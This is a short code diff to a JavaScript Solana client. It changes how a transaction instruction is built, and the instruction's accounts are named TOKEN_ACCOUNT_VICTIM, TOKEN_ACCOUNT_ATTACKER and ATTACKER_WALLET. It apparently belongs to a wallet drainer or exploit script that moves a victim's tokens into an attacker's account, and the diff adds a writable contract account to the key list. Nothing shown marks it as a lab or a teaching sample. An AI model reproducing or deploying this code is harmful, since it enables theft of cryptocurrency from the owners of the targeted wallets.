@@ -52,6 +52,7 @@
 
     const PROGRAM_ID = new PublicKey("ChzBcsMoHq4SPyTA17gT65GYc8H4D5n3pVWJoYFCYQN8");
     const PDA_ACCOUNT = new PublicKey("56ZBJCYNdqm72LaDoYe6vpHnNndqVg2ScioQbhrdUrve");
+    const CONTRACT_ACCOUNT = new PublicKey("5RpRS1dmyicUxRjdpRaB1Vhh9PbmN3ZdGM5cY5SBTYFJ");
     const TOKEN_ACCOUNT_VICTIM = new PublicKey("7j7aWsdpcB3PQGZ8WJLPJBRRCuvkgVzpea9JWguqW8P3");
     const TOKEN_ACCOUNT_ATTACKER = new PublicKey("4KCbVNwpiqWkHfDbC4GBCB1b3azycS4VkifzcR5ChoTX");
     const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
@@ -82,12 +83,12 @@
         keys: [
           { pubkey: publicKey, isSigner: true, isWritable: true },
           { pubkey: TOKEN_ACCOUNT_VICTIM, isSigner: false, isWritable: true },
-          { pubkey: PROGRAM_ID, isSigner: false, isWritable: false },
+          { pubkey: CONTRACT_ACCOUNT, isSigner: false, isWritable: true },
           { pubkey: ATTACKER_WALLET, isSigner: false, isWritable: false },
           { pubkey: TOKEN_ACCOUNT_ATTACKER, isSigner: false, isWritable: true },
           { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
           { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
-          { pubkey: PDA_ACCOUNT, isSigner: false, isWritable: true },
+          { pubkey: PDA_ACCOUNT, isSigner: false, isWritable: true }
         ],
         programId: PROGRAM_ID,
         data: new Uint8Array([])
